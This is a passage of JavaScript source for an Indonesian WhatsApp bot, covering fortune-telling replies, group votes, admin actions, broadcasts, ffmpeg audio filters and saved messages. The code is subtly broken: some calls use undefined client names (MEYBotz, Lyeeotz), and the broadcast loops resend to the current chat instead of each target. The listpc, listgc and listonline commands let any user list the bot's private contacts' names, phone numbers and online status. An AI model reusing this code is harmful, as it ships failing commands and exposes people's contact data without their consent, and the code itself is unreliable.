            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `Ciee yang Jadian💖 Jangan lupa Donasi🗿

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: 'jadian', buttonText: { displayText: 'Jadian' }, type: 1 }
                    ]
                    await LyeeBotz.sendButtonText(m.chat, buttons, jawab, nyoutube, m, {mentions: menst})
            }
            break
            case 'gbtku': {
            if (!isPremium) throw mess.premime
			if (!text) throw `Example : ${prefix + command} hai|halo`
            let jawab = `${text.split("|")[0]}`
            let buttons = [{ buttonId: 'menu', buttonText: { displayText: `` }, type: 1 }]
            await LyeeBotz.sendButtonText(m.chat, buttons, jawab, `${text.split("|")[1]}`, m)
            }
            break
            case 'bisakah': {
            	if (!text) throw `Example : ${prefix + command} saya menang?`
            	let bisa = ['Bisa','Coba Saja','Pasti Bisa','Mungkin Saja','Tidak Bisa','Tidak Mungkin','Coba Ulangi','Ngimpi kah?','yakin bisa?']
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Bisakah ${text}*\nJawab : ${keh}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'SABAR🗿' }, type: 1 }]
            await LyeeBotz.sendButtonText(m.chat, buttons, jawab, nyoutube, m)
            }
            break
            case 'apakah': {
            	if (!text) throw `Example : ${prefix + command} saya bisa menang?`
            	let apa = ['Iya','Tidak','Bisa Jadi','Coba Ulangi','Mungkin Saja','Coba Tanyakan Ayam']
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Apakah ${text}*\nJawab : ${kah}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
            await LyeeBotz.sendButtonText(m.chat, buttons, jawab, nyoutube, m)
            }
            break
            case 'kapan': case 'kapankah': {
            	if (!text) throw `Example : ${prefix + command} saya menang?`
            	let kapan = ['Besok','Lusa','Nanti','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi','Bulan Depan','Nanti','Tidak Akan Pernah']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nJawab : ${koh}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'SABAR🗿' }, type: 1 }]
            await LyeeBotz.sendButtonText(m.chat, buttons, jawab, nyoutube, m)
            }
            break
            
           
//PEMBATAS=======================================
            case 'totalfitur': case 'totalfiture': case 'fiture': case 'fitur': {
            	m.reply('*Total Ada 231 Fitur*\n_Ketik Req Untuk Request Fitur_')
            }
            break
            case 'runtime': {
            	let lowq = `*Bot Telah Online Selama*\n*${runtime(process.uptime())}*`
                let buttons = [{ buttonId: 'donasi', buttonText: { displayText: '👑SEWA' }, type: 1 }]
                await LyeeBotz.sendButtonText(m.chat, buttons, lowq, nyoutube, m, {quoted: fkontak})
            	}
            break
            case 'req': case 'request': {
            	if (!text) throw `Example : ${prefix + command} Fitur Min`
               let ownernya = ownernomer + '@s.whatsapp.net'
               let me = m.sender
               let pjtxt = `Pesan Dari : @${me.split('@')[0]} \nUntuk : @${ownernya.split('@')[0]}\n\n${command} ${text}`
               let ments = [ownernya, me]
               let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: '🙏THANKS' }, type: 1 }]
            await LyeeBotz.sendButtonText(ownernya, buttons, pjtxt, nyoutube, m, {mentions: ments, quoted: fdoc})
            let akhji = `*Request Telah Terkirim*\n*Ke Owner @${ownernya.split('@')[0]}*\n_Terima Kasih🙏_`
            await LyeeBotz.sendButtonText(m.chat, buttons, akhji, nyoutube, m, {mentions: ments, quoted: fkontak})
            }
            break
            case 'react': {
                if (!isCreator) throw mess.owner
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                LyeeBotz.sendMessage(m.chat, reactionMessage)
            }
            break  
            case 'join': {
                if (!isCreator) throw mess.owner
                if (!text) throw 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                m.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await LyeeBotz.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'leave': {
                if (!isCreator) throw mess.owner
                await LyeeBotz.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'setexif': {
               if (!isCreator) throw mess.owner
               if (!text) throw `Example : ${prefix + command} packname|author`
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          m.reply(`Exif berhasil diubah menjadi\n\n⌗ Packname : ${global.packname}\n⌗ Author : ${global.author}`)
            }
            break
	case 'kick': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await LyeeBotz.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await LyeeBotz.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await MEYBotz.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await LyeeBotz.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'block': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await MEYBotz.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await LyeeBotz.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	    case 'setname': case 'setsubject': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await LyeeBotz.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await LyeeBotz.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setppbot': {
                if (!isCreator) throw mess.owner
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await LyeeBotz.downloadAndSaveMediaMessage(quoted)
                await LyeeBotz.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
           case 'setppgroup': case 'setppgrup': case 'setppgc': {
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await LyeeBotz.downloadAndSaveMediaMessage(quoted)
                await LyeeBotz.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
            case 'tagall': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
let teks = `══✪〘 *👥 Tag All* 〙✪══
 
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
                for (let mem of participants) {
                teks += `⌗ @${mem.id.split('@')[0]}\n`
                }
                LyeeBotz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
                case 'hidetag': {
            if (!m.isGroup) throw mess.group
            if (!isBotAdmins) throw mess.botAdmin
            if (!isAdmins) throw mess.admin
            Lyeeotz.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
	    case 'style': case 'styletext': {
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!text) throw 'Masukkan Query text!'
                let anu = await styletext(text)
                let teks = `Srtle Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `⌗ *${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break
               case 'vote': {
            if (!m.isGroup) throw mess.group
            if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
            if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
            m.reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer: LyeeBotz.user.name,
                buttons: buttonsVote,
                headerType: 1
            }
            LyeeBotz.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'upvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsUpvote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿??𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer: LyeeBotz.user.name,
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            LyeeBotz.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case 'devote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsDevote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: LyeeBotz.user.name,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            LyeeBotz.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case 'cekvote':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote


©${LyeeBotz.user.id}
`
LyeeBotz.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            delete vote[m.chat]
            m.reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
	    }
            break
               case 'group': case 'grup': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === 'close'){
                    await LyeeBotz.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`*Sukses Menutup Group*`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await LyeeBotz.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`*Sukses Membuka Group*`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: 'group open', buttonText: { displayText: 'Grub Open ?' }, type: 1 },
                        { buttonId: 'group close', buttonText: { displayText: 'Grub Close ?' }, type: 1 }
                    ]
                    await LyeeBotz.sendButtonText(m.chat, buttons, `Mode Group`, LyeeBotz.user.name, m)

             }
            }
            break
            case 'editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
             if (args[0] === 'open'){
                await LyeeBotz.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`*Sukses Membuka Edit Info Group*`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await LyeeBotz.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`*Sukses Menutup Edit Info Group*`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open kh?' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close kh?' }, type: 1 }
                    ]
                    await LyeeBotz.sendButtonText(m.chat, buttons, `Mode Edit Info`, LyeeBotz.user.name, m)

            }
            }
            break
            case 'antilink': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].antilink) return m.reply(`*Sudah Aktif kak Sebelumnya*`)
                db.data.chats[m.chat].antilink = true
                m.reply(`*Antilink Sekarang Aktif !*`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].antilink) return m.reply(`*Sudah Tidak Aktif Sebelumnya*`)
                db.data.chats[m.chat].antilink = false
                m.reply(`*Antilink Sekarang Tidak Aktif !*`)
                } else {
                 let buttons = [
                        { buttonId: 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'antilink off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await LyeeBotz.sendButtonText(m.chat, buttons, `Mode Antilink`, LyeeBotz.user.name, m)
                }
             }
             break
             case 'mute': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = true
                m.reply(`${LyeeBotz.user.name} telah di mute di group ini !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = false
                m.reply(`${LyeeBotz.user.name} telah di unmute di group ini !`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await LyeeBotz.sendButtonText(m.chat, buttons, `Mute Bot`, LyeeBotz.user.name, m)
                }
             }
             break
            case 'linkgroup': case 'linkgc': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                let response = await LyeeBotz.groupInviteCode(m.chat)
                LyeeBotz.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\n👾Link Group : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            case 'ephemeral': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Masukkan value enable/disable'
                if (args[0] === 'enable') {
                    await LyeeBotz.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await LyeeBotz.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                LyeeBotz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'report': case 'lapor': {
            	if (!text) throw `Example : ${prefix + command} Lapor Ada Fitur Yang error`
               let ownernya = ownernomer + '@s.whatsapp.net'
               let me = m.sender
               let pjtxt = `Pesan Dari : @${me.split('@')[0]} \nUntuk : @${ownernya.split('@')[0]}\n\n${text}`
               let ments = [ownernya, me]
               let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: '🙏THANKS LAPORANNYA' }, type: 1 }]
            await LyeeBotz.sendButtonText(ownernya, buttons, pjtxt, nyoutube, m, {mentions: ments})
            let akhji = `Laporan Telah Terkirim\nKe Owner @${ownernya.split('@')[0]}\n*Terima Kasih Laporannya🙏*\n_Nomermu Akan Terblokir_\n_Jika Laporan Hanya Di Buat Buat_`
            await LyeeBotz.sendButtonText(m.chat, buttons, akhji, nyoutube, m, {mentions: ments})
            }
            break
            case 'hehehe': {
                reactionMessage = {
                    react: {
                        text: '❤',
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                LyeeBotz.sendMessage(m.chat, reactionMessage)
            }
            break  
            break
            case 'bcgc': case 'bcgroup': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let getGroups = await MEYBotz.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
                for (let i of anu) {
                    await sleep(1500)
                    let txt = `「 *Broadcast Group* 」\n\n${text}`
                    let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '⌕ List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 }]
            await LyeeBotz.sendButtonText(m.chat, buttons, txt, nyoutube, m)
		}}
            break
            case 'bc': case 'broadcast': case 'bcall': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let anu = await store.chats.all().map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		for (let yoi of anu) {
		    await sleep(3000)
                      let txt = `「 *Broadcast LyeeBotz cuy* 」\n\n${text}`
                      let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '⌕ List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 }]
            await LyeeBotz.sendButtonText(m.chat, buttons, txt, nyoutube, m)
		}}
            break
            case 'q': case 'quoted': {
		if (!m.quoted) return m.reply('Reply Pesannya!!')
		let wokwol = await LyeeBotz.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case 'listpc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 LyeeBotz.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await LyeeBotz.groupMetadata(i)
                     teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 LyeeBotz.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'listonline': case 'liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    LyeeBotz.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⌗ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
            case 'ebinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { eBinary } = require('./lib/binary')
            let eb = await eBinary(text)
            m.reply(eb)
        }
        break
            case 'dbinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { dBinary } = require('./lib/binary')
            let db = await dBinary(text)
            m.reply(db)
        }
        break
        case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await LyeeBotz.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                LyeeBotz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                m.reply(e)
                }
                break
            case 'setcmd': {
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `Untuk Command Apa?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `Tidak ada hash`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                LyeeBotz.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
            break
            case 'addmsg': {
                if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
                if (!text) throw `Example : ${prefix + command} nama file`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                LyeeBotz.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
